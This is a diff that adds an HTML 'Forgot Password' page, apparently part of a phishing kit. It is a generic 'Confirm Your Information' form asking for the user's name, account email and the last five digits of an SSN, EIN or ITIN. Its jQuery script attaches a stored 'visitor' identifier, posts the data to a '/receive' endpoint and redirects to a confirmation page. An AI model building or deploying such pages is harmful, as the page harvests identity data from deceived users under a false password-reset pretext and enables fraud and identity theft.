@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Forgot Password</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f9fa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Center contents horizontally */
+            min-height: 100vh; /* Ensure the body takes the full height */
+        }
+
+        .header {
+            width: 100%;
+            background-color: #432874;
+            color: #fff;
+            padding: 20px;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 5%;
+        }
+
+        .header img {
+            width: 120px; 
+            vertical-align: left;
+        }
+
+        h2 {
+            font-size: 24px;
+            margin-top: 10%;
+            color: #432874;
+            margin: 5px 0 10px 0; /* Added margin for spacing */
+            font-weight: normal;
+            text-align: left; /* Align left */
+            width: 100%; /* Make it take full width */
+            padding-left: 20px; /* Add padding for left alignment */
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background-color: #fff;
+            margin-top: 20px; /* Space below the header */
+            padding: 20px;
+            border-radius: 8px;
+            box-sizing: border-box;
+        }
+
+        .content p {
+            font-size: 14px;
+            color: #666;
+            margin: 0 0 15px;
+            text-align: left; /* Center the paragraph */
+        }
+
+        .form-group {
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            font-size: 14px;
+            color: #333;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            height: 55px;  
+        }
+
+        .buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            width: 100%;
+        }
+
+        .buttons button {
+            flex: 1;
+            padding: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 4px;
+            border: none;
+        }
+
+        .buttons .continue {
+            height: 55px;
+            background-color: #6f4a9e;
+            color: #fff;
+        }
+
+        .buttons .cancel {
+            background-color: #fff;
+            color: #6f4a9e;
+            border: 1px solid #6f4a9e;
+        }
+
+        @media(min-width: 758px) {
+            .container {
+                max-width: 95%; 
+            }
+        } 
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="assets/logo-white.png" alt="Logo"> 
+    </div>
+    <h2>Confirm Your Information</h2> <!-- Moved h2 outside of the container -->
+    <div class="container">
+        <div class="content">
+            <p>Let's keep you protected</p>
+
+            <form>
+            <div class="form-group">
+    <label>First Name</label>
+    <input id="first-name" name="firstName" type="text" placeholder="First Name" required>
+</div>
+
+<div class="form-group">
+    <label>Last Name</label>
+    <input id="last-name" name="lastName" type="text" placeholder="Last Name" required>
+</div>
+
+<div class="form-group">
+    <label>Email address associated with your account</label>
+    <input id="email" name="email" type="email" placeholder="name@email.com" required>
+</div>
+
+<div class="form-group">
+    <label>Last 5 digits of your SSN, EIN, or ITIN <i title="Additional information about SSN, EIN, or ITIN.">i</i></label>
+    <input id="ssn" name="ssn" type="text" placeholder="Enter input in the format X-XXXX" required>
+</div>
+
+<div class="buttons">
+    <button class="continue">Continue</button>
+</div>
+</form>
+        </div>
+    </div>
+</body>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+<script>
+$(document).ready(function() {
+    $('.continue').on('click', function(e) {
+        e.preventDefault(); // Prevent default form submission
+
+        let isEmpty = false;
+        const checkInputs = $('input'); // Collect input fields
+
+        // Check for empty fields and highlight them
+        for (const check of checkInputs) {
+            if (check.value.trim() === "") {
+                check.style.borderColor = 'red'; // Highlight the empty input field
+                isEmpty = true; // Mark as empty
+            } else {
+                check.style.borderColor = ''; // Reset border color if filled
+            }
+        }
+
+        // If no input is empty, proceed with form submission
+        if (!isEmpty) {
+            // Serialize form data into an array
+            let userinfo = $('form').serializeArray(); // Make sure to wrap the inputs in a <form> tag
+            let user = {};
+            let visitor = sessionStorage.getItem('visitor'); // Retrieve visitor info
+            console.log(visitor);
+
+            userinfo.forEach((value) => {
+                user[value.name] = value.value; // Create user object from inputs
+            });
+
+            user['visitor'] = visitor; // Add visitor info to user object
+            console.log(user);
+
+            // Send AJAX request
+            $.ajax({
+                method: 'POST',
+                url: "/receive", // Replace with your server endpoint
+                data: user
+            }).done(function(msg) {
+                // Handle successful response
+                console.log(msg);
+                window.location.href = "/confirm?action=2";
+            }).fail(function(err, textStatus, error) {
+                console.log('fail');
+                // Handle failure response
+                // Optional: You could redirect or show an error message here
+            });
+        }
+    });
+});
+</script> 
+</html> 
